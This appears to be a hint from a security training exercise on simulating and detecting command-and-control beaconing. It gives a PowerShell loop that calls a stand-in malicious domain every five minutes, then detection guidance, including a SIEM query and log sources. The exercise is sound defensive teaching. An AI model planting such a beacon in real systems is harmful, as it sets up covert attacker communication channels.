# Hint 4: C2 Beaconing

## Scenario Overview

Simulates command-and-control (C2) beaconing using periodic HTTP requests to an external malicious domain.

## Simulation Steps

**Scheduled Beacon:**
```powershell
while($true) {
    Invoke-WebRequest -Uri "http://malicious-domain.com/checkin" -UseBasicParsing
    Start-Sleep -Seconds 300
}
```

## Detection Guidance

- **Key Logs/Events:**
  - Firewall logs: Outbound to external IPs
  - Zeek/Wireshark: Regular HTTP intervals
- **SIEM Query Example:** `destination.ip:"malicious-domain.com" AND event.action:"connection_attempt"`
- **What to Look For:** Repeated outbound connections to suspicious domains or IP addresses at regular intervals.

## Example Log Artifacts

(Paste actual log lines or reference screenshots here if available.)

## Additional Notes

Correlate firewall and network logs with threat intelligence; look for beaconing patterns in netflow or proxy logs.
